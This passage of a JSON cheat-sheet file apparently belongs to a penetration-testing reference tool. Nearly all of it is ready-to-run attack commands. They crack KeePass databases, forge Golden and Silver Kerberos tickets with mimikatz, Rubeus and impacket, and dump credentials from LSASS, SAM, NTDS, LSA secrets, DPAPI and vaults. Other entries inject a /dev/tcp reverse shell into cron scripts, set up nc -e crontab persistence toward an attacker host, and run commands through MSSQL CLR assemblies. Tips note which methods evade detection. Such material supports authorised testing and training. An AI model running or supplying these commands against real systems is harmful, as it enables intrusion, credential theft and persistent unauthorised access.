        "title": "Show Cracked Passwords",
        "codes": [
          {
            "lang": "bash",
            "code": "hashcat -m 13400 keepass.hash --show"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      }
    ],
    "resources": []
  },
  {
    "category": "KeePass Password Manager",
    "title": "Cracking with John the Ripper",
    "tags": [],
    "steps": [
      {
        "title": "Basic Cracking",
        "codes": [
          {
            "lang": "bash",
            "code": "john keepass.hash --wordlist=/usr/share/wordlists/rockyou.txt"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "With Rules",
        "codes": [
          {
            "lang": "bash",
            "code": "john keepass.hash --wordlist=/usr/share/wordlists/rockyou.txt --rules=rockyou-30000"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Show Cracked Passwords",
        "codes": [
          {
            "lang": "bash",
            "code": "john keepass.hash --show"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Example Output",
        "codes": [
          {
            "lang": "plaintext",
            "code": "Database.kdbx:welcome\n\n1 password hash cracked, 0 left"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      }
    ],
    "resources": []
  },
  {
    "category": "Golden Ticket",
    "title": "Create Golden Ticket from Kali [Local]",
    "tags": [
      "Active_Directory",
      "Credential_Access",
      "Golden_Ticket",
      "Impacket",
      "Kerberos",
      "Mimikatz",
      "Persistence",
      "Rubeus",
      "Windows"
    ],
    "steps": [],
    "resources": [],
    "advanced": true,
    "notes": [
      {
        "type": "text",
        "content": "```bash\nimpacket-ticketer -nthash <KrbtgtHash> -domain-sid <DomainSID> -domain <Domain> Administrator\n```"
      },
      {
        "type": "text",
        "content": "```bash\n# Use the ticket\nexport KRB5CCNAME=Administrator.ccache\nimpacket-psexec -k -no-pass <Domain>/Administrator@<TargetDC>\n```"
      }
    ]
  },
  {
    "category": "Golden Ticket",
    "title": "Create Golden Ticket with Mimikatz [Remote]",
    "tags": [
      "Active_Directory",
      "Credential_Access",
      "Golden_Ticket",
      "Impacket",
      "Kerberos",
      "Mimikatz",
      "Persistence",
      "Rubeus",
      "Windows"
    ],
    "steps": [],
    "resources": [],
    "advanced": true,
    "notes": [
      {
        "type": "text",
        "content": "```powershell\n.\\mimikatz.exe \"kerberos::golden /user:Administrator /domain:<Domain> /sid:<DomainSID> /krbtgt:<KrbtgtHash> /ptt\" \"exit\"\n```"
      },
      {
        "type": "text",
        "content": "```powershell\n# Save to file instead of injecting\n.\\mimikatz.exe \"kerberos::golden /user:Administrator /domain:<Domain> /sid:<DomainSID> /krbtgt:<KrbtgtHash> /ticket:golden.kirbi\" \"exit\"\n```"
      },
      {
        "type": "text",
        "content": "```powershell\n# Specify user ID (500 = default Administrator)\n.\\mimikatz.exe \"kerberos::golden /user:FakeAdmin /domain:<Domain> /sid:<DomainSID> /krbtgt:<KrbtgtHash> /id:500 /ptt\" \"exit\"\n```"
      }
    ]
  },
  {
    "category": "Golden Ticket",
    "title": "Create Golden Ticket with Rubeus [alternative]",
    "tags": [
      "Active_Directory",
      "Credential_Access",
      "Golden_Ticket",
      "Impacket",
      "Kerberos",
      "Mimikatz",
      "Persistence",
      "Rubeus",
      "Windows"
    ],
    "steps": [],
    "resources": [],
    "advanced": true,
    "notes": [
      {
        "type": "text",
        "content": "```powershell\n.\\Rubeus.exe golden /rc4:<KrbtgtHash> /user:Administrator /domain:<Domain> /sid:<DomainSID> /ptt\n```"
      }
    ]
  },
  {
    "category": "Shadow Copies Extraction",
    "title": "Create Shadow Copy",
    "tags": [
      "Active_Directory",
      "Credential_Access",
      "NTDS",
      "Windows"
    ],
    "steps": [
      {
        "title": "Create Shadow Copy with vssadmin",
        "codes": [
          {
            "lang": "powershell",
            "code": "vssadmin create shadow /for=C:"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Create Shadow Copy with WMI",
        "codes": [
          {
            "lang": "powershell",
            "code": "(Get-WmiObject -List Win32_ShadowCopy).Create('C:\\', 'ClientAccessible')"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Create Shadow Copy with PowerShell",
        "codes": [
          {
            "lang": "powershell",
            "code": "Invoke-CimMethod -ClassName Win32_ShadowCopy -MethodName Create -Arguments @{Volume='C:\\'}"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      }
    ],
    "resources": [],
    "advanced": true,
    "notes": [
      {
        "type": "note",
        "content": "Creating shadow copies requires administrator privileges and may be logged.",
        "variant": "warning"
      }
    ]
  },
  {
    "category": "Silver Ticket",
    "title": "Create Silver Ticket from Kali [Local]",
    "tags": [
      "Active_Directory",
      "Credential_Access",
      "Impacket",
      "Kerberos",
      "Mimikatz",
      "Persistence",
      "Silver_Ticket",
      "Windows"
    ],
    "steps": [],
    "resources": [],
    "advanced": true,
    "notes": [
      {
        "type": "text",
        "content": "```bash\nimpacket-ticketer -nthash <ServiceHash> -domain-sid <DomainSID> -domain <Domain> -spn cifs/<TargetFQDN> Administrator\n```"
      },
      {
        "type": "text",
        "content": "```bash\n# Use the ticket\nexport KRB5CCNAME=Administrator.ccache\nimpacket-smbclient -k -no-pass <Domain>/Administrator@<TargetFQDN>\n```"
      }
    ]
  },
  {
    "category": "Silver Ticket",
    "title": "Create Silver Ticket with Mimikatz [Remote]",
    "tags": [
      "Active_Directory",
      "Credential_Access",
      "Impacket",
      "Kerberos",
      "Mimikatz",
      "Persistence",
      "Silver_Ticket",
      "Windows"
    ],
    "steps": [
      {
        "title": "CIFS (file shares)",
        "codes": [
          {
            "lang": "powershell",
            "code": ".\\mimikatz.exe \"kerberos::golden /user:Administrator /domain:<Domain> /sid:<DomainSID> /target:<TargetFQDN> /service:cifs /rc4:<ServiceHash> /ptt\" \"exit\""
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "HTTP (WinRM/PSRemoting)",
        "codes": [
          {
            "lang": "powershell",
            "code": ".\\mimikatz.exe \"kerberos::golden /user:Administrator /domain:<Domain> /sid:<DomainSID> /target:<TargetFQDN> /service:http /rc4:<ServiceHash> /ptt\" \"exit\""
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "HOST (scheduled tasks, WMI)",
        "codes": [
          {
            "lang": "powershell",
            "code": ".\\mimikatz.exe \"kerberos::golden /user:Administrator /domain:<Domain> /sid:<DomainSID> /target:<TargetFQDN> /service:host /rc4:<ServiceHash> /ptt\" \"exit\""
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      }
    ],
    "resources": [],
    "advanced": true
  },
  {
    "category": "Password Strategy",
    "title": "Creating Custom Wordlists",
    "tags": [],
    "steps": [
      {
        "title": "Based on Company Name",
        "codes": [
          {
            "lang": "bash",
            "code": "# Using cewl to scrape website\ncewl http://<TargetWebsite> -w custom.txt -d 2\n\n# Add year variations\ncat custom.txt | sed 's/$/@2024/' >> custom_year.txt\ncat custom.txt | sed 's/$/2024/' >> custom_year.txt\ncat custom.txt | sed 's/$/123/' >> custom_year.txt"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Based on Username",
        "codes": [
          {
            "lang": "bash",
            "code": "# If username is \"john.smith\"\ncat > john_passwords.txt << EOF\njohn\nsmith\njohnsmith\njohn.smith\njohn123\nsmith123\njohnsmith123\nEOF"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      }
    ],
    "resources": []
  },
  {
    "category": "Mimikatz",
    "title": "Credential Dumping",
    "tags": [
      "Active_Directory",
      "Credential_Access",
      "Mimikatz",
      "Windows"
    ],
    "steps": [
      {
        "title": "Dump All Credentials from LSASS",
        "codes": [
          {
            "lang": "bash",
            "code": "mimikatz # privilege::debug\nmimikatz # sekurlsa::logonpasswords"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "postNotes": [
          {
            "type": "note",
            "content": "This is the most common Mimikatz command - dumps all credentials in memory.",
            "variant": "tip"
          },
          {
            "type": "text",
            "content": "**Output includes:**\n- Username and domain\n- NTLM hash\n- SHA1 hash\n- Plaintext passwords (if WDigest is enabled)\n- Kerberos tickets"
          }
        ]
      },
      {
        "title": "Dump WDigest Credentials",
        "codes": [
          {
            "lang": "bash",
            "code": "mimikatz # sekurlsa::wdigest"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "postNotes": [
          {
            "type": "note",
            "content": "WDigest stores plaintext passwords in memory (disabled by default on Windows 8.1+).",
            "variant": "info"
          }
        ]
      },
      {
        "title": "Dump Kerberos Tickets",
        "codes": [
          {
            "lang": "bash",
            "code": "mimikatz # sekurlsa::tickets"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Dump Kerberos Encryption Keys",
        "codes": [
          {
            "lang": "bash",
            "code": "mimikatz # sekurlsa::ekeys"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "postNotes": [
          {
            "type": "note",
            "content": "Shows AES256, AES128, and RC4 keys for Kerberos authentication.",
            "variant": "tip"
          }
        ]
      },
      {
        "title": "Dump TGT (Ticket Granting Tickets)",
        "codes": [
          {
            "lang": "bash",
            "code": "mimikatz # sekurlsa::tickets /export"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "postNotes": [
          {
            "type": "note",
            "content": "Exports all Kerberos tickets to `.kirbi` files in current directory."
          }
        ]
      }
    ],
    "resources": [],
    "advanced": true
  },
  {
    "category": "Active Directory and Kerberos Attacks",
    "title": "Credential Dumping",
    "tags": [
      "Active_Directory",
      "Kerberos",
      "Windows"
    ],
    "steps": [
      {
        "title": "Mimikatz - Local",
        "codes": [
          {
            "lang": "bash",
            "code": "privilege::debug\nsekurlsa::logonpasswords\nlsadump::lsa /patch\nlsadump::sam\nlsadump::secrets\nlsadump::cache\nsekurlsa::tickets /export"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "LSASS with Procdump",
        "codes": [
          {
            "lang": "bash",
            "code": "procdump.exe -accepteula -ma lsass.exe lsass.dmp"
          },
          {
            "lang": "bash",
            "code": "sekurlsa::minidump lsass.dmp\nsekurlsa::logonpasswords"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "LSASS with comsvcs.dll",
        "codes": [
          {
            "lang": "bash",
            "code": "rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump <LSASS_PID> C:\\Temp\\lsass.dmp full"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Registry Hives",
        "codes": [
          {
            "lang": "bash",
            "code": "reg save HKLM\\SAM sam.hive\nreg save HKLM\\SYSTEM system.hive\nreg save HKLM\\SECURITY security.hive"
          },
          {
            "lang": "bash",
            "code": "impacket-secretsdump -sam sam.hive -system system.hive -security security.hive LOCAL"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Remote Secretsdump",
        "codes": [
          {
            "lang": "bash",
            "code": "impacket-secretsdump <Domain>/<User>:<Pass>@<TargetIP>\nimpacket-secretsdump <Domain>/<User>@<TargetIP> -hashes :<NTHash>"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      }
    ],
    "resources": [],
    "foundational": true
  },
  {
    "category": "NetExec",
    "title": "Credential Dumping",
    "tags": [
      "Active_Directory",
      "Discovery",
      "Enumeration",
      "NetExec",
      "Windows"
    ],
    "steps": [
      {
        "title": "Dump SAM Hashes",
        "codes": [
          {
            "lang": "bash",
            "code": "nxc smb <TargetIP> -u <Username> -p '<Password>' --sam"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Dump LSA Secrets",
        "codes": [
          {
            "lang": "bash",
            "code": "nxc smb <TargetIP> -u <Username> -p '<Password>' --lsa"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Dump NTDS.dit (Domain Controller)",
        "codes": [
          {
            "lang": "bash",
            "code": "nxc smb <DomainController> -u <Username> -p '<Password>' --ntds"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "postNotes": [
          {
            "type": "note",
            "content": "Requires Domain Admin or equivalent privileges.",
            "variant": "warning"
          }
        ]
      },
      {
        "title": "Dump NTDS with Specific Method",
        "codes": [
          {
            "lang": "bash",
            "code": "nxc smb <DomainController> -u <Username> -p '<Password>' --ntds vss"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "postNotes": [
          {
            "type": "text",
            "content": "**Methods:**\n- `vss` - Volume Shadow Copy (default)\n- `drsuapi` - Directory Replication Service API"
          }
        ]
      },
      {
        "title": "Dump LSASS",
        "codes": [
          {
            "lang": "bash",
            "code": "nxc smb <TargetIP> -u <Username> -p '<Password>' -M lsassy"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "postNotes": [
          {
            "type": "note",
            "content": "Uses lsassy module for stealthier LSASS dumping.",
            "variant": "tip"
          }
        ]
      }
    ],
    "resources": [],
    "foundational": true
  },
  {
    "category": "Credential Dumping - Cached",
    "title": "Credential Dumping - Cached and Stored",
    "tags": [
      "Credential_Access",
      "Windows"
    ],
    "steps": [
      {
        "title": "LSA Secrets - Service Account Passwords",
        "codes": [
          {
            "lang": "bash",
            "code": ".\\mimikatz.exe \"privilege::debug\" \"token::elevate\" \"lsadump::secrets\" \"exit\" > lsa_secrets.txt"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Contains service account passwords, autologon credentials, VPN passwords.",
            "variant": "tip"
          }
        ]
      },
      {
        "title": "Cached Domain Credentials - DCC2",
        "codes": [
          {
            "lang": "bash",
            "code": ".\\mimikatz.exe \"privilege::debug\" \"token::elevate\" \"lsadump::cache\" \"exit\" > cached_creds.txt"
          },
          {
            "lang": "bash",
            "code": "hashcat -m 2100 cached_creds.txt rockyou.txt"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Cached domain logon hashes. Crack with **hashcat** `-m 2100`.",
            "variant": "info"
          }
        ]
      },
      {
        "title": "DPAPI Master Keys",
        "codes": [
          {
            "lang": "bash",
            "code": ".\\mimikatz.exe \"privilege::debug\" \"sekurlsa::dpapi\" \"exit\" > dpapi_keys.txt"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Used to decrypt Windows secrets (browser passwords, saved credentials).",
            "variant": "info"
          }
        ]
      },
      {
        "title": "Credential Manager Vault",
        "codes": [
          {
            "lang": "bash",
            "code": ".\\mimikatz.exe \"privilege::debug\" \"token::elevate\" \"vault::cred /patch\" \"exit\" > vault_creds.txt"
          },
          {
            "lang": "bash",
            "code": "cmdkey /list > cmdkey_list.txt"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Stored Windows credentials (RDP, network shares, etc.).",
            "variant": "tip"
          }
        ]
      },
      {
        "title": "Validate Cracked DCC2 Credentials",
        "codes": [
          {
            "lang": "bash",
            "code": "nxc smb <DCIP> -u <Username> -p '<CrackedPassword>' -d <Domain>"
          },
          {
            "lang": "bash",
            "code": "nxc smb 192.168.1.0/24 -u <Username> -p '<CrackedPassword>' -d <Domain>"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": true,
        "notes": [
          {
            "type": "note",
            "content": "After cracking cached credentials with **hashcat** `-m 2100`.",
            "variant": "info"
          }
        ]
      }
    ],
    "resources": [
      {
        "text": "HackTricks Cached Credentials",
        "url": "https://book.hacktricks.xyz/windows-hardening/stealing-credentials#cached-credentials"
      }
    ],
    "foundational": true,
    "notes": [
      {
        "type": "note",
        "content": "Extract cached domain credentials, LSA secrets, DPAPI keys, and Credential Manager vaults.",
        "variant": "info"
      }
    ]
  },
  {
    "category": "Credential Dumping - LSASS",
    "title": "Credential Dumping - LSASS",
    "tags": [
      "Credential_Access",
      "Mimikatz",
      "Windows"
    ],
    "steps": [
      {
        "title": "Procdump - Sysinternals",
        "codes": [
          {
            "lang": "bash",
            "code": "procdump.exe -accepteula -ma lsass.exe lsass.dmp"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": true,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Less detected than **Mimikatz**. Transfer dump to Kali for parsing.",
            "variant": "tip"
          }
        ]
      },
      {
        "title": "Parse LSASS Dump",
        "codes": [
          {
            "lang": "bash",
            "code": "pypykatz lsa minidump lsass.dmp > lsass_creds.txt"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": true
      },
      {
        "title": "Parse with Mimikatz",
        "codes": [
          {
            "lang": "bash",
            "code": ".\\mimikatz.exe \"sekurlsa::minidump lsass.dmp\" \"sekurlsa::logonpasswords\" \"exit\" > lsass_mimikatz.txt"
          }
        ],
        "optional": false,
        "alternative": true,
        "remote": false,
        "local": false
      },
      {
        "title": "Task Manager Method - GUI",
        "codes": [
          {
            "lang": "bash",
            "code": "Dump saved to: C:\\Users\\<Username>\\AppData\\Local\\Temp\\lsass.DMP"
          }
        ],
        "optional": false,
        "alternative": true,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Open Task Manager as Admin \u2192 Details tab \u2192 find lsass.exe \u2192 right-click \u2192 Create dump file.",
            "variant": "tip"
          }
        ]
      },
      {
        "title": "comsvcs.dll - No Upload Required",
        "codes": [
          {
            "lang": "bash",
            "code": "tasklist | findstr lsass"
          },
          {
            "lang": "bash",
            "code": "rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump <LsassPID> C:\\temp\\lsass.dmp full"
          }
        ],
        "optional": false,
        "alternative": true,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Uses built-in Windows DLL. Find LSASS PID first.",
            "variant": "tip"
          }
        ]
      },
      {
        "title": "Mimikatz Direct",
        "codes": [
          {
            "lang": "bash",
            "code": ".\\mimikatz.exe \"privilege::debug\" \"sekurlsa::logonpasswords\" \"exit\" > lsass_direct.txt"
          }
        ],
        "optional": false,
        "alternative": true,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Parses LSASS directly without creating dump file. More likely to be detected.",
            "variant": "warning"
          }
        ]
      },
      {
        "title": "Validate Extracted Credentials",
        "codes": [
          {
            "lang": "bash",
            "code": "nxc smb <TargetIP> -u <Username> -p '<Password>' -d <Domain>"
          },
          {
            "lang": "bash",
            "code": "nxc smb <TargetIP> -u <Username> -H '<NTLMHash>' -d <Domain>"
          },
          {
            "lang": "bash",
            "code": "nxc smb 192.168.1.0/24 -u <Username> -H '<NTLMHash>' -d <Domain>"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": true
      }
    ],
    "resources": [
      {
        "text": "HackTricks LSASS Dumping",
        "url": "https://book.hacktricks.xyz/windows-hardening/stealing-credentials#lsass"
      }
    ],
    "foundational": true,
    "notes": [
      {
        "type": "note",
        "content": "Extract credentials from LSASS memory. Requires **SeDebugPrivilege** (admin/SYSTEM).",
        "variant": "important"
      }
    ]
  },
  {
    "category": "Credential Dumping - SAM",
    "title": "Credential Dumping - SAM",
    "tags": [
      "Credential_Access",
      "Impacket",
      "Windows"
    ],
    "steps": [
      {
        "title": "Export Registry Hives",
        "codes": [
          {
            "lang": "bash",
            "code": "reg save HKLM\\SAM C:\\temp\\SAM\nreg save HKLM\\SYSTEM C:\\temp\\SYSTEM\nreg save HKLM\\SECURITY C:\\temp\\SECURITY"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": true,
        "local": false
      },
      {
        "title": "Extract Hashes",
        "codes": [
          {
            "lang": "bash",
            "code": "impacket-secretsdump -sam SAM -system SYSTEM -security SECURITY LOCAL > secretsdump_local.txt"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": true
      },
      {
        "title": "Mimikatz SAM Dump",
        "codes": [
          {
            "lang": "bash",
            "code": ".\\mimikatz.exe \"privilege::debug\" \"token::elevate\" \"lsadump::sam\" \"exit\" > mimikatz_sam.txt"
          }
        ],
        "optional": false,
        "alternative": true,
        "remote": false,
        "local": false
      },
      {
        "title": "Mimikatz Full Credential Dump",
        "codes": [
          {
            "lang": "bash",
            "code": ".\\mimikatz.exe \"privilege::debug\" \"token::elevate\" \"sekurlsa::logonpasswords\" \"lsadump::sam\" \"lsadump::secrets\" \"lsadump::cache\" \"exit\" > mimikatz_full.txt"
          }
        ],
        "optional": false,
        "alternative": true,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Dumps SAM, LSA secrets, and cached credentials in one command.",
            "variant": "tip"
          }
        ]
      },
      {
        "title": "SharpSecDump",
        "codes": [
          {
            "lang": "bash",
            "code": ".\\SharpSecDump.exe > sharpsecdump.txt"
          }
        ],
        "optional": false,
        "alternative": true,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": ".NET alternative to **secretsdump**.",
            "variant": "tip"
          }
        ]
      },
      {
        "title": "Validate Extracted Hashes",
        "codes": [
          {
            "lang": "bash",
            "code": "nxc smb <TargetIP> -u Administrator -H '<NTLMHash>' --local-auth"
          },
          {
            "lang": "bash",
            "code": "nxc smb 192.168.1.0/24 -u Administrator -H '<NTLMHash>' --local-auth"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": true
      }
    ],
    "resources": [
      {
        "text": "HackTricks SAM Dumping",
        "url": "https://book.hacktricks.xyz/windows-hardening/stealing-credentials#sam-and-system"
      }
    ],
    "foundational": true,
    "notes": [
      {
        "type": "note",
        "content": "Extract local account hashes from SAM registry hives. Requires admin/SYSTEM.",
        "variant": "important"
      }
    ]
  },
  {
    "category": "Active Directory and Kerberos Attacks",
    "title": "Credential Hunting",
    "tags": [
      "Active_Directory",
      "Kerberos",
      "Windows"
    ],
    "steps": [
      {
        "title": "PowerShell History",
        "codes": [
          {
            "lang": "powershell",
            "code": "(Get-PSReadlineOption).HistorySavePath\nGet-Content $env:APPDATA\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt\nGet-Content (Get-PSReadlineOption).HistorySavePath | Select-String -Pattern 'password|secret|key'"
          },
          {
            "lang": "bash",
            "code": "type %userprofile%\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Check for credentials accidentally typed in commands."
          }
        ]
      },
      {
        "title": "Search Files for Passwords",
        "codes": [
          {
            "lang": "bash",
            "code": "findstr /si password *.txt\nfindstr /si password *.xml\nfindstr /si password *.ini\nfindstr /si password *.config\ndir /s /b *pass*\ndir /s /b *cred*\ndir /s /b *.config"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Search Registry for Passwords",
        "codes": [
          {
            "lang": "bash",
            "code": "reg query HKLM /f password /t REG_SZ /s\nreg query HKCU /f password /t REG_SZ /s"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "HKLM search requires Admin privileges."
          }
        ]
      },
      {
        "title": "KeePass Database Cracking",
        "codes": [
          {
            "lang": "bash",
            "code": "dir /s /b C:\\*.kdbx"
          },
          {
            "lang": "powershell",
            "code": "Get-ChildItem -Path C:\\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue"
          },
          {
            "lang": "bash",
            "code": "/usr/share/john/keepass2john Database.kdbx > keepass.hash\njohn --wordlist=/usr/share/wordlists/rockyou.txt keepass.hash\njohn --show keepass.hash"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Keytab File Extraction",
        "substeps": [
          {
            "title": "Common Keytab Locations",
            "codes": [],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false,
            "notes": [
              {
                "type": "note",
                "content": "`/etc/krb5.keytab` - Default system keytab\n`/var/lib/sss/db/` - SSSD keytab cache\n`/tmp/krb5cc_*` - User ticket cache files"
              }
            ]
          },
          {
            "title": "Extract Keys with KeyTabExtract",
            "codes": [
              {
                "lang": "bash",
                "code": "python KeyTabExtract.py <KeytabFile>"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          },
          {
            "title": "Convert to Hashcat Format",
            "codes": [
              {
                "lang": "bash",
                "code": "python KeyTabExtract.py <KeytabFile> --hash"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          },
          {
            "title": "Use Keytab for Authentication",
            "codes": [
              {
                "lang": "bash",
                "code": "kinit -kt <KeytabFile> <Principal>\nklist"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Keytab files contain Kerberos principal keys. Found on Linux servers with Kerberos integration."
          }
        ]
      }
    ],
    "resources": [
      {
        "text": "KeyTabExtract GitHub",
        "url": "https://github.com/sosdave/KeyTabExtract"
      }
    ],
    "foundational": true
  },
  {
    "category": "Password Strategy",
    "title": "Credential Storage",
    "tags": [],
    "steps": [
      {
        "title": "Document Everything",
        "codes": [
          {
            "lang": "plaintext",
            "code": "Service: SSH\nHost: 10.10.10.5\nUsername: admin\nPassword: Password123!\nNotes: Found via password spray\nDate: 2024-01-15"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Organize by Host",
        "codes": [
          {
            "lang": "plaintext",
            "code": "=== 10.10.10.5 ===\nSSH: admin:Password123!\nSMB: admin:Password123!\nMySQL: root:Password123!\n\n=== 10.10.10.6 ===\nRDP: administrator:Welcome1\nWinRM: administrator:Welcome1"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      }
    ],
    "resources": []
  },
  {
    "category": "Linux Privilege Escalation",
    "title": "Cron Jobs Exploitation",
    "tags": [
      "Linux",
      "Post_Exploitation",
      "Privilege_Escalation"
    ],
    "steps": [
      {
        "title": "Enumerate Cron Jobs",
        "codes": [
          {
            "lang": "bash",
            "code": "cat /etc/crontab\nls -la /etc/cron.d/\nls -la /etc/cron.daily/\nls -la /etc/cron.hourly/\nls -la /etc/cron.monthly/\nls -la /etc/cron.weekly/\ncrontab -l"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Monitor for Cron Execution",
        "codes": [
          {
            "lang": "bash",
            "code": "# Use pspy to monitor processes\n./pspy64"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Writable Cron Scripts",
        "codes": [
          {
            "lang": "bash",
            "code": "echo 'bash -i >& /dev/tcp/<AttackerIP>/<Port> 0>&1' >> /path/to/cron/script.sh"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "If cron script is writable, inject reverse shell."
          }
        ]
      }
    ],
    "resources": [],
    "foundational": true
  },
  {
    "category": "Linux Persistence",
    "title": "Crontab Persistence",
    "tags": [
      "Linux",
      "Persistence"
    ],
    "steps": [
      {
        "title": "Reverse Shell Cron (Daily at Midnight)",
        "codes": [
          {
            "lang": "bash",
            "code": "# Open crontab editor\ncrontab -e\n\n# Add the following line at the end:\n0 0 * * * nc <AttackerIP> <AttackerPort> -e /bin/sh"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Run Payload Daily at Midnight",
        "codes": [
          {
            "lang": "bash",
            "code": "# Open crontab editor\ncrontab -e\n\n# Add the following line at the end:\n0 0 * * * <FullPathToPayload>"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      }
    ],
    "resources": [],
    "foundational": true,
    "notes": [
      {
        "type": "note",
        "content": "Schedule persistent tasks using cron.\n\nMore info at: https://crontab.guru/"
      }
    ]
  },
  {
    "category": "MS SQL Privilege Escalation",
    "title": "Custom Assemblies (CLR)",
    "tags": [
      "Exploitation",
      "Privilege_Escalation",
      "SQL",
      "Windows"
    ],
    "steps": [
      {
        "title": "Enable CLR",
        "codes": [
          {
            "lang": "sql",
            "code": "EXEC sp_configure 'clr enabled', 1\nRECONFIGURE\n\n-- For untrusted assemblies\nALTER DATABASE master SET TRUSTWORTHY ON"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": true,
        "local": false
      },
      {
        "title": "Create Assembly from Hex",
        "codes": [
          {
            "lang": "sql",
            "code": "CREATE ASSEMBLY myAssembly\nFROM 0x4D5A90... -- Hex-encoded DLL\nWITH PERMISSION_SET = UNSAFE"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": true,
        "local": false
      },
      {
        "title": "Create Procedure from Assembly",
        "codes": [
          {
            "lang": "sql",
            "code": "CREATE PROCEDURE [dbo].[cmdExec]\n@cmd NVARCHAR(4000)\nAS EXTERNAL NAME [myAssembly].[StoredProcedures].[cmdExec]"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": true,
        "local": false
      },
      {
        "title": "Execute Custom Procedure",
        "codes": [
          {
            "lang": "sql",
            "code": "EXEC cmdExec 'whoami'"
          }
        ],
        "optional": false,
        "alternative": false,
